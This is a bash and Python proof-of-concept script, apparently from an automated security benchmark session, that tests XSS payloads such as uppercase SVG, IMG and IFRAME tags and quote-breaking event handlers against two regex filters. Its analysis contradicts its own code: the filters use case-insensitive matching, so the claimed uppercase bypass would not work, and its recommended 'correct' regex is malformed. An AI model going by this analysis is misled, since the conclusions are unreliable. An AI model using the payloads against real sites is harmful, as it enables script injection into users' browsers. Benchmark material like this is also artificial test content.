#!/bin/bash
# POC: Direct analysis of vulnerable regex filters showing how uppercase HTML tags and quote injection bypass XSS protection
# Target: ./repo
# Created: 2025-11-05T17:02:14.404Z
# Session: benchmark-XBEN-012-24-mhm7ivyh

# XSS Filter Bypass POC - Direct Regex Filter Analysis
# This script reproduces the vulnerable regex filters from the application
# and demonstrates how they can be bypassed with uppercase HTML tags

echo "=========================================="
echo "XSS Filter Bypass - Regex Analysis POC"
echo "=========================================="
echo ""

# Create a Python script to test the vulnerable regex filters
python << 'EOF'
import re

print("[*] Analyzing Vulnerable Regex Filters")
print("=" * 50)
print()

# Vulnerable filters from the application
filter_xss_quotes = r"""[\"']XSS[\"']"""
filter_html_tags = r"""<[a-z/]"""

print(f"Filter 1 (XSS quotes): {filter_xss_quotes}")
print(f"Filter 2 (HTML tags):  {filter_html_tags}")
print()

# Test payloads
payloads = [
    ('\" onload=alert(1) \"', "Quote break with onload attribute"),
    ('<SVG onload=alert(1)>', "Uppercase SVG tag"),
    ('<IMG SRC=x onerror=alert(1)>', "Uppercase IMG tag"),
    ('\" autofocus onfocus=\"alert(1)\" \"', "Autofocus with onfocus"),
    ('<IFRAME src=javascript:alert(1)></IFRAME>', "Uppercase IFRAME tag"),
    ('<Body onload=alert(1)>', "Uppercase BODY tag"),
    ('<ScRiPt>alert(1)</ScRiPt>', "Mixed case SCRIPT tag"),
    ('<svg onload=alert(1)>', "Lowercase svg tag (for comparison)"),
]

print("[*] Testing Payloads Against Filters")
print("=" * 50)
print()

for payload, description in payloads:
    print(f"Payload: {payload}")
    print(f"Description: {description}")
    
    # Apply filters
    msg = payload
    msg_after_filter1 = re.sub(filter_xss_quotes, "", msg, flags=re.IGNORECASE)
    msg_after_filter2 = re.sub(filter_html_tags, "", msg_after_filter1, flags=re.IGNORECASE)
    
    # Check if payload survived both filters
    filter1_removed = msg_after_filter1 != msg
    filter2_removed = msg_after_filter2 != msg_after_filter1
    survived = msg_after_filter2 == msg
    
    print(f"  After filter 1 (XSS quotes): {msg_after_filter1}")
    print(f"  After filter 2 (HTML tags):  {msg_after_filter2}")
    print(f"  Filter 1 matched: {filter1_removed}")
    print(f"  Filter 2 matched: {filter2_removed}")
    print(f"  Payload SURVIVED filters: {'YES - VULNERABLE!' if survived else 'NO - Blocked'}")
    
    # If survived, show how it would appear in HTML context
    if survived:
        html_output = f'<input type=text value="{msg_after_filter2}">'
        print(f"  HTML output: {html_output}")
        # Check if the output contains XSS payload components
        if any(xss_keyword in msg_after_filter2.lower() for xss_keyword in ['onload=', 'onerror=', 'onfocus=', 'javascript:']):
            print(f"  XSS EXECUTABLE: YES - Contains event handler or javascript: URL")
    
    print()

print()
print("=" * 50)
print("[*] ROOT CAUSE ANALYSIS")
print("=" * 50)
print()
print("The regex filter '<[a-z/]' has critical flaws:")
print()
print("1. Character class [a-z/] is TOO RESTRICTIVE:")
print("   - Matches: a-z (lowercase) and / (forward slash)")
print("   - Does NOT match: A-Z (uppercase), 0-9, other special chars")
print()
print("2. Uppercase tag bypass:")
print("   - <svg> would be blocked (first char 's' in [a-z])")
print("   - <SVG> bypasses filter (first char 'S' NOT in [a-z])")
print()
print("3. Quote breaking bypass:")
print("   - Closing the value attribute with \" allows new attributes")
print("   - Example: value=\"\" onload=\"alert(1)\" \"")
print()
print("4. Correct regex would be: r'<[A-Za-z0-9/]' or better r'</?[a-zA-Z]+['")
print()
print("[+] VERDICT: Multiple XSS payloads can bypass these filters!")

EOF

echo ""
echo "=========================================="